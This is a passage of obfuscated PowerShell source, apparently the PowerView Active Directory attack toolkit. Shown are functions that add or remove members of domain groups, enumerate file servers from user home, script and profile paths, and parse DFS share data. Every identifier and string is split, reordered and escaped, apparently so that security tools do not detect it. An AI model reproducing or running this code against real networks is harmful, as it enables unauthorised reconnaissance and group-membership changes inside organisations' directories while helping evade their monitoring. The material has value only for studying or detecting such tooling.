                        ${o`U`Tput} | &("{3}{2}{0}{1}" -f'be','r','d-Mem','Ad') ("{2}{1}{0}"-f 'ty','eProper','Not') ("{1}{4}{2}{0}{3}{5}" -f'in','L','stOrig','atingDsa','a','DN') ${TeM`pObj`EcT}."psZLASTo`R`Ig`InAT`inGDsaDN"
                        ${OUtp`Ut}."ps`Ob`JECT"."type`NaM`Es".("{2}{0}{1}"-f's','ert','In').Invoke(0, ("{6}{7}{10}{5}{9}{1}{2}{3}{0}{4}{8}" -f 'mberDel','i','nGroup','Me','e','o','Po','werView','ted','ma','.D'))
                        ${OU`T`put}
                    }
                }
                else {
                    &("{1}{3}{2}{0}"-f 'e','Write-V','os','erb') ('[Get-'+'Doma'+'inGr'+'oupM'+'e'+'mber'+'Deleted] '+'Error'+' '+'re'+'t'+'r'+'ieving '+(('m'+'zIm'+'sd'+'s'+'-r'+'eplval'+'u'+'emeta'+'datamzI ')  -cRePLAcE  'mzI',[chaR]39)+'f'+'or '+"'$ObjectDN'")
                }
            }
        }
    }
}


function ADd-`do`MaInGROUp`mEmbeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}" -f 'rocess','PSS','houl','dP'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POsItiOn = 0, MAndaTORy = ${T`RUE})]
        [Alias({"{1}{2}{3}{0}"-f 'e','Gr','oupN','am'}, {"{1}{3}{2}{0}" -f 'tity','G','n','roupIde'})]
        [String]
        ${Ide`N`TIty},

        [Parameter(mandaTORY = ${Tr`Ue}, VAlUeFRompIPeLINe = ${tR`UE}, VAlueFrOmpiPELINEBypROpERtynaMe = ${tR`UE})]
        [Alias({"{4}{3}{1}{0}{2}"-f 'tit','erIden','y','mb','Me'}, {"{1}{0}"-f 'ber','Mem'}, {"{2}{0}{4}{3}{1}"-f'ting','dName','Dis','e','uish'})]
        [String[]]
        ${Me`m`Bers},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`Om`AiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eDE`NtiAL} =   (  VariABlE  ("Qf"+"N") -valuEONl  )::"EM`pTY"
    )

    BEGIN {
        ${COn`T`e`xTARGuments} = @{
            ("{1}{0}{2}" -f 't','Identi','y') = ${ideN`TI`Ty}
        }
        if (${psb`oun`DpARamE`TERS}[("{0}{1}" -f'Do','main')]) { ${cONTExTArg`U`m`E`N`TS}[("{0}{1}"-f'Dom','ain')] = ${d`oMA`iN} }
        if (${psbOU`NdPA`RaMete`Rs}[("{0}{3}{2}{1}" -f 'Cred','l','tia','en')]) { ${cO`N`TExT`ArGUm`E`Nts}[("{2}{0}{3}{1}"-f 'den','l','Cre','tia')] = ${c`R`EdeNT`IAL} }

        ${g`R`ouPc`oNtEXt} = &("{1}{0}{4}{3}{2}"-f 'inc','Get-Pr','ntext','o','ipalC') @ContextArguments

        if (${gR`oUP`CONTEXT}) {
            try {
                ${Gr`OUP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{1}{2}{0}"-f 'ity','FindByIde','nt').Invoke(${GRo`UpcONtE`xt}."CO`N`TExt", ${grouPCOn`TE`xT}."i`dE`NTIty")
            }
            catch {
                &("{1}{2}{0}" -f 'arning','Write-','W') ('[A'+'d'+'d-D'+'omainG'+'roupMem'+'ber] '+'Er'+'ror '+'finding'+' '+'t'+'he '+'group'+' '+'iden'+'t'+'ity '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${G`RoUp}) {
            ForEach (${me`mbeR} in ${M`emBe`RS}) {
                if (${me`M`BEr} -match ((("{3}{2}{1}{0}"-f'0}.+','{0}{','+','.'))-f  [cHaR]92)) {
                    ${CONt`extA`R`g`UMen`Ts}[("{1}{0}{2}" -f'e','Id','ntity')] = ${ME`MB`er}
                    ${USeRcONT`e`XT} = &("{5}{3}{0}{4}{6}{2}{1}"-f 'in','ext','nt','et-Pr','cipal','G','Co') @ContextArguments
                    if (${U`S`eRCOntEXT}) {
                        ${u`s`e`RIdE`NtITY} = ${usEr`CO`NTE`XT}."i`DeNt`ItY"
                    }
                }
                else {
                    ${u`Serco`N`TEXt} = ${g`ROuPcoNTE`xt}
                    ${U`Se`Ri`DenT`Ity} = ${mE`mB`ER}
                }
                &("{0}{3}{2}{1}{4}" -f 'W','te-Ve','i','r','rbose') ('[A'+'dd-'+'Do'+'mainGro'+'upMember] '+'Add'+'ing'+' '+'membe'+'r '+"'$Member' "+'to'+' '+'gr'+'oup '+"'$Identity'")
                ${M`EM`BEr} = [System.DirectoryServices.AccountManagement.Principal]::("{0}{2}{4}{3}{1}"-f 'F','ity','indBy','ent','Id').Invoke(${U`ser`c`ONTExT}."CO`Nte`xT", ${u`sEri`denTItY})
                ${g`R`oUP}."mE`MberS".("{1}{0}" -f'dd','A').Invoke(${M`E`mBEr})
                ${g`RouP}.("{0}{1}" -f 'S','ave').Invoke()
            }
        }
    }
}


function rE`MOvE-DOmaI`Ng`RO`UpMEmB`eR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{4}{3}" -f'SShoul','d','P','rocess','P'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(posItiOn = 0, MANdaTorY = ${Tr`UE})]
        [Alias({"{2}{0}{1}"-f 'ou','pName','Gr'}, {"{1}{3}{0}{2}"-f'upIdenti','Gr','ty','o'})]
        [String]
        ${I`DEN`TITy},

        [Parameter(MANdATorY = ${Tr`UE}, ValuEfRoMpIPeLIne = ${T`RuE}, valUEfRoMpIPElInEbYPROPeRtYnAMe = ${T`RuE})]
        [Alias({"{2}{3}{0}{1}{4}"-f 'erIden','tit','M','emb','y'}, {"{0}{1}{2}"-f'M','emb','er'}, {"{1}{2}{3}{0}" -f 'hedName','Distin','gu','is'})]
        [String[]]
        ${m`EM`BERs},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`ma`in},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`e`deNtI`AL} =   (  ls ("{2}{3}{1}{0}" -f 'N',':qF','VArIaBL','E'))."VA`LuE"::"EM`ptY"
    )

    BEGIN {
        ${c`oNtex`TAR`guMeN`TS} = @{
            ("{0}{1}{2}" -f 'I','denti','ty') = ${iDE`N`T`iTY}
        }
        if (${pSbOu`NDpa`R`AMEterS}[("{0}{2}{1}"-f'Do','ain','m')]) { ${conTe`X`TARG`UMeNTS}[("{1}{0}" -f'n','Domai')] = ${d`OM`AIn} }
        if (${PSb`OUnDpAra`Me`Te`Rs}[("{0}{3}{1}{2}" -f'Cred','ti','al','en')]) { ${cO`NTe`xtaR`GUmeNtS}[("{1}{2}{0}" -f'ential','C','red')] = ${cR`EdE`NTiAl} }

        ${G`Ro`U`PCONTexT} = &("{1}{2}{0}{3}"-f'ncipalCon','G','et-Pri','text') @ContextArguments

        if (${G`ROUpcoN`TExt}) {
            try {
                ${gr`oup} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{1}{2}{3}{0}"-f'y','FindByIde','nti','t').Invoke(${GR`OUpC`OnTE`XT}."c`ONte`xt", ${g`R`OUPcoN`T`Ext}."i`DEn`TIty")
            }
            catch {
                &("{2}{1}{3}{0}"-f'g','rn','Write-Wa','in') ('[Rem'+'ove-DomainGroup'+'Me'+'mber'+'] '+'Error'+' '+'fi'+'ndin'+'g '+'th'+'e '+'g'+'roup '+'identi'+'ty'+' '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${gr`O`Up}) {
            ForEach (${mE`mBer} in ${M`EmBE`Rs}) {
                if (${m`E`mBer} -match ((("{0}{2}{1}" -f '.+{0}{','.+','0}')) -f [CHar]92)) {
                    ${cO`N`TeXt`A`RGU`menTs}[("{1}{2}{0}" -f 'entity','I','d')] = ${MeMb`Er}
                    ${u`seR`coNTE`XT} = &("{4}{0}{3}{5}{1}{2}{6}" -f 'Prin','alCon','t','c','Get-','ip','ext') @ContextArguments
                    if (${U`sERc`onT`Ext}) {
                        ${uSE`RIDE`NtiTY} = ${use`RCON`TEXT}."ide`N`TItY"
                    }
                }
                else {
                    ${uSErc`o`NtEXT} = ${g`R`o`UPCOn`TeXt}
                    ${useR`id`EnT`ity} = ${MeM`Ber}
                }
                &("{2}{3}{1}{0}"-f'Verbose','e-','Wri','t') ('[Remove-Dom'+'ainG'+'roup'+'Membe'+'r] '+'Remov'+'in'+'g '+'membe'+'r '+"'$Member' "+'from'+' '+'g'+'rou'+'p '+"'$Identity'")
                ${me`MbeR} = [System.DirectoryServices.AccountManagement.Principal]::("{2}{1}{4}{0}{3}"-f 'en','in','F','tity','dById').Invoke(${u`S`ercON`TExT}."contE`XT", ${USe`RID`entITy})
                ${gr`OUP}."M`emb`eRS".("{1}{0}"-f 'ove','Rem').Invoke(${M`embER})
                ${gR`O`Up}.("{0}{1}"-f 'Sa','ve').Invoke()
            }
        }
    }
}


function get-D`O`MaIN`FilEServ`er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}"-f'd','PSSh','oul','Process'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( VAlUefrOMpipELInE = ${TR`UE}, VALuEFrOMpiPElinEbYprOpERTYNAme = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'inNam','e','Doma'}, {"{0}{1}"-f'N','ame'})]
        [String[]]
        ${Do`mA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filte','r'})]
        [String]
        ${L`dApF`il`TeR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'AD','SPath'})]
        [String]
        ${seA`RChBA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{5}{0}{2}{3}{1}" -f'nt','r','r','olle','Domain','Co'})]
        [String]
        ${SeRV`Er},

        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{0}{1}"-f 'O','neLevel'}, {"{1}{0}"-f'ubtree','S'})]
        [String]
        ${S`EArCh`Sc`ope} = ("{0}{1}{2}" -f'Su','btr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`Ult`pAG`E`siZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVe`R`TimelI`m`It},

        [Switch]
        ${tO`mbSTO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDEN`TI`Al} =  (gET-vAriABLe  ("{1}{0}" -f 'N','qF')  -VALueonly)::"E`mpty"
    )

    BEGIN {
        function splIt`-p`A`Th {
            
            Param([String]${PA`TH})

            if (${p`Ath} -and (${PA`Th}.("{1}{0}" -f'it','spl').Invoke('\\')."c`OUNT" -ge 3)) {
                ${tE`mP} = ${pA`TH}.("{1}{0}"-f't','spli').Invoke('\\')[2]
                if (${te`MP} -and (${te`mP} -ne '')) {
                    ${te`mp}
                }
            }
        }

        ${Se`ARCH`eRArGUmEN`Ts} = @{
            ("{1}{0}{3}{2}" -f'D','L','ilter','APF') = ((("{25}{1}{0}{2}{23}{4}{15}{33}{35}{7}{31}{32}{29}{12}{34}{5}{14}{28}{26}{6}{24}{3}{18}{8}{19}{36}{37}{22}{13}{20}{10}{16}{21}{9}{27}{17}{30}{11}" -f'cco','samA','un','1.4.','8',':1.2.','55','8)(!(use',')(Nwu(homedi','f','th=',')','tCo','script','840','05','*)(p','=*)','803:=2)','r','pa','ro','*)(','tType=','6.','(&(','113','ilepath','.','oun',')','rAc','c','306','ntrol','36','ectory','='))-cRePLAcE 'Nwu',[ChAr]124)
            ("{0}{1}{2}" -f'Prope','rt','ies') = ("{0}{9}{7}{10}{5}{4}{3}{1}{6}{8}{2}" -f'home','pr','path',',','th','ptpa','of','ory,s','ile','direct','cri')
        }
        if (${PSb`ouN`dParaMETE`RS}[("{0}{2}{3}{1}"-f 'Sea','e','rch','Bas')]) { ${se`Arc`hERargU`mENtS}[("{2}{0}{3}{1}" -f'h','e','Searc','Bas')] = ${se`ArcHB`Ase} }
        if (${PsB`oun`d`Para`METERs}[("{2}{0}{1}"-f'v','er','Ser')]) { ${sEa`RCHERaR`GuMe`NtS}[("{1}{2}{0}" -f 'ver','Se','r')] = ${sE`RVER} }
        if (${Psbo`UND`PAr`AMETeRS}[("{1}{0}{2}"-f'ea','S','rchScope')]) { ${sEa`Rc`H`er`ARGUm`EnTs}[("{2}{0}{1}"-f'earchSc','ope','S')] = ${SeA`RCh`sC`OpE} }
        if (${PSBo`Un`dPA`RametErS}[("{2}{0}{3}{1}"-f 'l','e','Resu','tPageSiz')]) { ${S`eARC`He`RAR`g`UmEnts}[("{1}{2}{0}" -f 'eSize','R','esultPag')] = ${re`S`UlTp`A`GesiZE} }
        if (${psBO`Un`dpARam`eTeRS}[("{4}{0}{1}{2}{3}" -f 'rTi','me','L','imit','Serve')]) { ${seArC`hE`RARG`UM`e`NTS}[("{0}{4}{2}{3}{1}" -f 'ServerT','mit','L','i','ime')] = ${SE`R`VErt`Ime`li`mIT} }
        if (${pSBOUNDPA`RA`m`et`ers}[("{0}{1}{2}"-f'Tom','bston','e')]) { ${Sea`R`C`HErArguM`en`Ts}[("{1}{2}{0}" -f'one','T','ombst')] = ${TomBS`T`ONE} }
        if (${PSbO`U`Ndp`AR`AMEters}[("{0}{2}{3}{1}" -f 'Cred','l','ent','ia')]) { ${S`earcHe`Rar`guME`NTs}[("{2}{0}{1}"-f 'e','dential','Cr')] = ${CRED`eNt`i`Al} }
    }

    PROCESS {
        if (${PSB`o`UNdp`AR`AMETerS}[("{1}{0}"-f 'main','Do')]) {
            ForEach (${Ta`RgET`d`OmaIn} in ${d`Om`Ain}) {
                ${seAr`C`hEraR`GU`MEnTs}[("{1}{0}"-f 'ain','Dom')] = ${t`A`RgETD`oMaIn}
                ${uS`e`RsE`ARCher} = &("{3}{0}{2}{1}{5}{4}"-f't-','m','Do','Ge','Searcher','ain') @SearcherArguments
                
                $(ForEach(${UsE`RreS`U`lT} in ${uSe`RsEArCh`ER}.("{2}{1}{0}" -f'l','indAl','F').Invoke()) {if (${uSer`RES`U`Lt}."PropER`Ti`eS"[("{2}{1}{0}"-f 'directory','ome','h')]) {&("{1}{0}{2}" -f'-Pa','Split','th')(${user`RESu`LT}."ProPEr`T`I`eS"[("{3}{2}{1}{0}"-f 'rectory','medi','o','h')])}if (${u`S`ERrE`Sult}."proPErT`I`es"[("{1}{2}{0}" -f'h','scriptpa','t')]) {&("{0}{2}{1}" -f 'Split','Path','-')(${uSe`R`R`esULt}."P`ROpe`RtIes"[("{0}{1}{2}"-f'scr','iptpa','th')])}if (${U`seRr`EsU`Lt}."P`R`OPERTIES"[("{0}{1}{2}{3}"-f'profi','lepa','t','h')]) {&("{0}{2}{1}" -f'Split-','th','Pa')(${USe`RREs`ULt}."pro`PeR`TIeS"[("{2}{1}{3}{0}"-f 'lepath','rof','p','i')])}}) | &("{0}{2}{1}" -f 'Sort','ct','-Obje') -Unique
            }
        }
        else {
            ${u`se`RseA`RcHer} = &("{0}{4}{1}{2}{5}{3}"-f 'Get-Dom','e','ar','er','ainS','ch') @SearcherArguments
            $(ForEach(${uSE`R`RESUlT} in ${U`SErse`ArcHER}.("{1}{2}{0}"-f 'l','Fi','ndAl').Invoke()) {if (${Use`RRe`S`UlT}."p`Rop`eRTies"[("{0}{4}{2}{1}{3}" -f'home','re','i','ctory','d')]) {&("{0}{1}{2}" -f 'Sp','li','t-Path')(${u`ser`ResuLT}."pr`oPer`TI`Es"[("{3}{4}{2}{0}{1}"-f'ct','ory','re','h','omedi')])}if (${uSerRE`su`Lt}."Pro`pE`RTI`eS"[("{1}{2}{0}"-f'th','sc','riptpa')]) {&("{2}{1}{0}" -f 'th','a','Split-P')(${uSE`RReSu`lT}."Pr`OpEr`TIES"[("{1}{0}{2}"-f'tpa','scrip','th')])}if (${usE`Rre`SuLT}."proP`e`Rt`Ies"[("{1}{0}{2}{3}"-f'fi','pro','lep','ath')]) {&("{2}{1}{0}" -f 'Path','lit-','Sp')(${User`R`EsulT}."p`RoPEr`TIEs"[("{1}{2}{3}{0}"-f'ath','prof','i','lep')])}}) | &("{1}{2}{3}{0}"-f'bject','S','o','rt-O') -Unique
        }
    }
}


function g`eT-DOMaINDF`SS`h`ArE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}"-f 'oce','PS','ShouldPr','ss'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{8}{7}{0}{1}{9}{6}{2}{5}{10}{4}"-f 'Va','rsMo','sig','PS','nts','n','eThanAs','d','UseDeclare','r','me'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f'P','SU','edVerbs','seApprov'}, '')]
    [OutputType({"{10}{5}{3}{9}{8}{7}{2}{4}{6}{0}{1}"-f 'b','ject','tomation.PSCus','nag','tom','m.Ma','O','Au','.','ement','Syste'})]
    [CmdletBinding()]
    Param(
        [Parameter( vAlUEFROMPIPeLIne = ${t`RuE}, VaLUEFRoMpipeLInEbYprOPeRTYnaME = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'ainNam','Dom','e'}, {"{0}{1}"-f 'Na','me'})]
        [String[]]
        ${do`MA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'DSPath','A'})]
        [String]
        ${sEA`RChba`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}" -f 'nC','oller','Domai','ontr'})]
        [String]
        ${s`eRv`eR},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}{2}" -f 'Lev','One','el'}, {"{1}{2}{0}"-f 'ee','S','ubtr'})]
        [String]
        ${SeArC`HscO`pE} = ("{0}{1}"-f'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`SU`LTpages`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RverTim`E`LI`MIT},

        [Switch]
        ${t`ombS`T`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`edEn`TI`AL} =  (vAriaBlE  ("{1}{0}" -f 'N','QF')  -vaLUeonL )::"e`mPtY",

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${vE`RsioN} = 'All'
    )

    BEGIN {
        ${s`EAr`ChEraR`g`U`meNTs} = @{}
        if (${psBo`UnD`PaRAm`E`TERs}[("{2}{1}{0}" -f 'e','chBas','Sear')]) { ${seAR`Che`RArGu`m`eNTS}[("{1}{0}{2}"-f 'ea','S','rchBase')] = ${s`E`A`RChBaSE} }
        if (${p`sbouNDPAr`AM`E`TerS}[("{0}{2}{1}" -f 'Se','r','rve')]) { ${SEArCHe`RarGu`men`Ts}[("{0}{1}"-f'Serve','r')] = ${sE`Rver} }
        if (${PSB`o`UnDp`Ar`AMeteRS}[("{0}{2}{1}"-f 'Searc','Scope','h')]) { ${s`eaRc`HE`R`Ar`guMEnTs}[("{1}{2}{0}"-f'e','Searc','hScop')] = ${S`e`ARChscO`PE} }
        if (${PsboundPar`Am`ETE`RS}[("{2}{3}{1}{0}" -f 'Size','e','Resul','tPag')]) { ${Se`A`RcHEraRgum`EN`Ts}[("{2}{3}{1}{0}"-f'ize','geS','Resul','tPa')] = ${RESuLtPAG`eSI`ZE} }
        if (${PSBOUNDpa`Ram`ET`eRS}[("{0}{3}{1}{2}{4}" -f'S','r','Ti','erve','meLimit')]) { ${SEarC`HERa`RgU`MENTs}[("{1}{2}{0}" -f 'meLimit','ServerT','i')] = ${S`eRVErT`ImElI`mit} }
        if (${PSBOuN`DpArA`M`EtErs}[("{0}{1}{2}" -f'Tomb','s','tone')]) { ${SeA`RCh`eraRGum`EnTs}[("{2}{0}{1}"-f 'n','e','Tombsto')] = ${tO`M`Bs`TOne} }
        if (${Ps`Bo`UN`DPaRAm`et`ERS}[("{2}{1}{0}{3}"-f'i','t','Creden','al')]) { ${SeaRcH`eRA`Rgum`eNTS}[("{1}{2}{0}"-f'tial','Cr','eden')] = ${cr`E`Den`TiAl} }

        function PARSe-P`Kt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${p`kT}
            )

            ${b`IN} = ${P`kt}
            ${b`lob_`VE`Rs`ion} =   ${6um`OD}::"T`o`UiNt32"(${b`iN}[0..3],0)
            ${B`lOB`_ELEm`ENt_C`oUnt} =  ${6U`M`od}::"tOUIn`T`32"(${B`IN}[4..7],0)
            ${OFfs`et} = 8
            
            ${oB`J`ECT_`LIsT} = @()
            for(${I}=1; ${I} -le ${Blob_ElE`ME`N`T_COUNt}; ${i}++){
                ${BlOB_n`AmE`_`S`iZE_stARt} = ${ofF`Set}
                ${BlOB`_naM`e_sIZ`e_`End} = ${oFf`sEt} + 1
                ${bLo`B_Na`mE_`S`izE} =   ${6`UM`OD}::"t`o`UInt16"(${B`IN}[${BLOB`_nA`Me_Siz`E_S`T`Art}..${bL`OB_n`Ame_sI`ZE`_`EnD}],0)

                ${BLo`B_na`Me_s`T`ARt} = ${b`lOB_naM`e_siZe_`E`ND} + 1
                ${BLOb_`N`AMe_e`ND} = ${B`Lo`B_n`AM`E_sTARt} + ${BLoB`_`N`AMe_Si`ze} - 1
                ${B`L`OB`_nAmE} =  ${2`Z1j}::"uni`cOde"."gets`TrI`NG"(${B`IN}[${blOB_`Na`Me`_s`TART}..${BloB_nA`Me`_E`Nd}])

                ${bl`OB_`DATa_si`zE_st`A`RT} = ${BloB_naME`_e`ND} + 1
                ${BLoB_D`A`TA`_sIze`_`end} = ${BLob_datA`_Si`Z`E_s`TaRT} + 3
                ${blo`B_dATA_`sIZe} =  ${6UM`od}::"to`UINT32"(${b`In}[${blOB`_dAT`A_siz`E_STaRT}..${blOB`_d`AtA_s`iz`e_EnD}],0)

                ${bL`Ob_DAta_st`ART} = ${bLOB_d`Ata_sIz`E_`e`Nd} + 1
                ${B`l`ob`_Da`Ta_enD} = ${BlOb`_d`ATA`_s`TaRt} + ${bLOB`_DaTA_S`i`ze} - 1
                ${b`LOb_d`ATA} = ${B`iN}[${B`loB_`d`ATa_sTart}..${b`lOb_`D`At`A_eNd}]
                switch -wildcard (${BloB_`N`AME}) {
                    ((("{0}{2}{1}"-f'{0}sitero','t','o')) -f  [CHAr]92) {  }
                    ((("{1}{2}{3}{0}" -f'ot*','{0}','d','omainro'))  -F [CHAr]92) {
                        
                        
                        ${r`oO`T_Or_l`i`NK_guid_StArT} = 0
                        ${r`o`oT_`O`R_LIN`k_GUi`D_enD} = 15
                        ${RO`OT_OR_`L`InK_GUiD} = [byte[]]${Bl`oB`_dA`Ta}[${RoOT_OR_`l`ink_`gu`i`D_S`TArt}..${RoOT`_Or_`lInk`_`GUI`d_enD}]
                        ${g`UId} = &("{2}{0}{1}" -f'w-','Object','Ne') ("{0}{1}" -f'Gui','d')(,${ROo`T_OR_`LiNK_g`UID}) 
                        ${P`Refix_`s`IZe_StaRT} = ${Root`_o`R_`l`In`k_gUID_`END} + 1
                        ${PRE`FIX_`SIZe_`ENd} = ${PrEFi`X_s`iZe_s`Ta`RT} + 1
                        ${pR`E`Fi`x_siZE} =   (gEt-vaRIablE ('6uM'+'Od'))."v`AlUe"::"to`UiN`T16"(${BlOb`_`data}[${PRefIx`_`Siz`E_StA`RT}..${prefIx`_SiZ`E_`end}],0)
                        ${pReFi`x_S`T`ArT} = ${pr`EFI`x_`siZE_`e`Nd} + 1
                        ${P`Ref`IX`_end} = ${pr`e`F`Ix_starT} + ${PRE`FIX_s`I`ZE} - 1
                        ${P`REF`ix} =  ( GEt-chIlDITEm ("V"+"AriaBl"+"E:2Z1j") )."VAL`UE"::"u`NIc`odE"."get`s`TRiNg"(${b`LOB_da`Ta}[${PRef`Ix_`s`TART}..${p`ReFiX_`eND}])

                        ${Short`_`P`R`efIX_`Si`Ze`_Start} = ${P`R`eFI`x_EnD} + 1
                        ${sH`O`RT`_pReFIx_s`IZE`_End} = ${s`HoRt_P`RefIx`_SiZE`_s`TA`RT} + 1
                        ${S`Ho`RT_PrEFiX`_Si`zE} =   (ChilDITem ('VAriabl'+'E:'+'6u'+'mO'+'d'))."vaL`UE"::"tOui`NT`16"(${bLOb`_Da`Ta}[${shorT_`PREFiX_s`I`z`e`_sTaRt}..${s`hort_p`R`eFix`_`SIzE_end}],0)
                        ${SHO`RT_pREfix_`s`TA`RT} = ${Sh`O`RT`_preFIX_siZe_ENd} + 1
                        ${SH`orT_p`REFiX`_enD} = ${s`hO`RT_`PreF`IX_STaRt} + ${shORt_pRE`FI`X_`sIzE} - 1
                        ${SH`O`R`T_pr`EFiX} =   (iTeM ('vAr'+'iABle:2z'+'1J')  )."VA`luE"::"U`NIc`oDE"."GET`sTRi`NG"(${bL`oB_da`Ta}[${SHOrT_pRE`Fi`X_ST`ArT}..${Shor`T_pR`e`FIX_E`ND}])

                        ${tY`PE_s`TA`Rt} = ${sh`ort_p`Re`FI`x_e`ND} + 1
                        ${tY`PE_e`ND} = ${TyP`e`_StArT} + 3
                        ${Ty`Pe} =   (  Get-vAriaBlE ("{1}{0}" -f 'umoD','6'))."va`Lue"::"TOuIn`T32"(${BL`O`B_DAtA}[${t`yP`e_`STArT}..${tYP`E_eND}],0)

                        ${StAt`E`_S`TArt} = ${Ty`pE`_END} + 1
                        ${s`T`Ate_E`Nd} = ${s`Ta`Te_St`ART} + 3
                        ${St`ATE} =  ( VARiABLE  ("{0}{1}"-f '6','uMOD') )."VAL`Ue"::"Touin`T`32"(${BlO`B`_datA}[${sT`A`Te_STaRT}..${St`At`E`_eNd}],0)

                        ${C`o`MMeNt_S`iz`e`_sTaRt} = ${Sta`Te`_enD} + 1
                        ${Co`MMeN`T`_SIZe`_eNd} = ${cOMMENT`_`S`i`ze_`starT} + 1
                        ${COM`M`E`Nt_sIze} =   ( variAblE ('6u'+'MOd')  -VaL )::"T`oUIn`T16"(${B`lOB`_data}[${COmmEnt_s`iZ`E_STa`Rt}..${cOMmEN`T`_s`iZe_eND}],0)
                        ${cOmMe`N`T`_sTArt} = ${coMmenT_S`izE`_`eND} + 1
                        ${c`omME`NT_End} = ${c`Omm`eNt_St`ArT} + ${com`ment`_`si`ZE} - 1
                        if (${C`OmMent_`SI`ZE} -gt 0)  {
                            ${Co`M`mEnt} =   (GeT-vARiabLe ('2Z1'+'j'))."V`ALUE"::"uN`ICodE"."g`eTsTRi`NG"(${bL`oB`_DATa}[${co`M`mENT_`stA`Rt}..${C`oMM`ENT`_ENd}])
                        }
                        ${P`REfI`X`_TI`MEs`Tamp_St`ART} = ${co`mM`ent_E`ND} + 1
                        ${pR`e`FIx_`TI`mESTAmP`_enD} = ${pRe`FI`X_tI`meSTAm`P_`staRT} + 7
                        
                        ${PReFix_`T`Im`eS`Ta`MP} = ${bLo`B_Da`Ta}[${pRE`F`Ix`_TimeSta`MP_sTA`Rt}..${p`Refi`x`_`TIMe`sTA`mP_end}] 
                        ${sTAtE`_t`imeSt`AM`P`_S`TART} = ${P`R`EFix_T`IMEstA`mP`_end} + 1
                        ${STA`T`e_TIMEsT`AMP`_end} = ${StATe_`TI`mESTa`Mp_`StArt} + 7
                        ${sTAT`E`_ti`mESt`AmP} = ${B`Lo`B`_DAtA}[${Sta`TE_`TimeST`Amp_s`TarT}..${STat`E_TI`mESTAMp`_END}]
                        ${COM`M`ENt_t`imES`TA`MP_StaRt} = ${st`At`E`_TI`meStA`Mp_e`ND} + 1
                        ${cOmMEnT_`TI`Mes`Tam`P`_e`Nd} = ${cOmmEn`T_t`I`mest`AmP_stART} + 7
                        ${C`om`Me`Nt_T`IMESTa`MP} = ${bLOb_D`A`TA}[${COmMEN`T_time`sta`mP_stA`RT}..${COm`M`eNt_`TIM`EstaMp_`eNd}]
                        ${vErsI`O`N`_s`Tart} = ${C`Om`M`eNT_tIMeSTamP_e`Nd}  + 1
                        ${vER`S`IoN_ENd} = ${vE`Rs`io`N_S`TaRt} + 3
                        ${VeRsI`on} =   ${6u`Mod}::"tOUi`NT`32"(${blo`B_`D`ATA}[${Ve`RSIo`N_ST`Art}..${vEr`SioN`_ENd}],0)

                        
                        ${D`FS_tar`g`EtLis`T`_b`lo`B_sI`Ze_s`TArT} = ${V`erS`i`on_END} + 1
                        ${Dfs_tAr`g`E`TLisT_BLOB_s`ize_EnD} = ${dFS_`TA`RGetL`isT_`B`lOB_SIz`e`_StaRt} + 3
                        ${DFS_`T`A`R`geT`lIST_B`LOB_Size} =  ${6uM`od}::"tOU`I`NT32"(${BLo`B`_dATa}[${d`FS`_t`ArGeT`LiSt_bL`ob_sIzE_StarT}..${dfS_T`Arge`TLI`sT`_BLOB`_`SiZe_End}],0)

                        ${Dfs_T`ArGE`T`LisT_B`lOb_St`ART} = ${DFs_T`ArGEtLiST_BLo`B`_SIzE`_E`ND} + 1
                        ${dfS_tA`R`gETl`ISt_BlOB`_eND} = ${dF`s_`TAr`gEt`L`iSt_b`L`OB_Start} + ${d`Fs_tAR`ge`TList_`BL`O`B_sI`ZE} - 1
                        ${D`FS`_Ta`RG`E`TLis`T_BLOb} = ${Blo`B_Da`TA}[${d`F`S_`T`A`RGEtlIsT_bLob_s`Ta`RT}..${D`Fs`_`TAr`GETLiST_blOB`_`ENd}]
                        ${ResEr`Ve`D_Blo`B_s`Iz`E_`S`TarT} = ${D`FS_taRGeTlIS`T_blO`B`_EnD} + 1
                        ${r`eSERve`d_BlOb`_si`ZE_enD} = ${r`ESEr`Ved_bL`Ob`_SIZe_STart} + 3
